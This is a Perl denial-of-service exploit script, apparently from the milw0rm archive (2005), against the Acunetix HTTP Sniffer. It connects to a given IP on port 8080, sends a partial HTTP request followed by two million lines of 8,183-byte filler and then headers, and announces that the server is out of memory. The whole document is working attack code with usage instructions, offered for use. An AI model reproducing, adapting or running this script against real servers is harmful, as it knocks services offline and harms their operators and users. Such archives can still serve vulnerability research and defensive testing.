#!/usr/bin/perl
#
#  Acunetix HTTP Sniffer DOS Exploit
# ------------------------------------
#  Infam0us Gr0up - Securiti Research
#
#
# Tested on Windows2000 SP4 (Win NT)
# Info: infamous.2hell.com
# Vendor URL: www.acunetix.com

$ARGC=@ARGV;
if ($ARGC !=2) {
   print "\n";
   print "  Acunetix HTTP Sniffer DOS Exploit\n";
   print "-------------------------------------\n\n";
   print "Usage: $0 [remote IP] \n";
   print "Exam: $0 127.0.0.1\n";
   exit;
}

use IO::Socket::INET;

$host=$ARGV[0];
$port= "8080";

print "\n";
print "[+] Connect to $host..\n";
$sock = IO::Socket::INET->new(PeerAddr => $host,PeerPort => $port, Proto => 'tcp')
|| die "[-] Connection error$@\n";
print "[+] Connected\n";
sleep(1);

print "[+] Build buffer..\n";
sleep(1);
$hostname="Host: $host";
$bufy='A'x50;
$bufa='A'x8183;
$len=length($bufy);
$buff="GET / HTTP/1.1\r\n";
sleep(1);

print "[+] Sending request..\n";
send($sock,$buff,0) || die "[-] send error:$@\n";
print "[+] Send DOS..";
for($i= 0; $i < 2000000; $i++)
{
$buff=" $bufa\r\n";
send($sock,$buff,0) || die "send error:$@\n[*] Check if server D0s'ed\n";
}

$buff="$hostname\r\n";
$buff.="Content-Length: $len\r\n";
$buff.="\r\n";
$buff.=$bufy."\r\n\r\n";

print "[+] Now kill the process..\n";
send($sock,$buff,0) || die "[-] send error:$@\n";
print "[+] DONE..Server Out of Memory\n";
close($sock);

# milw0rm.com [2005-08-05]
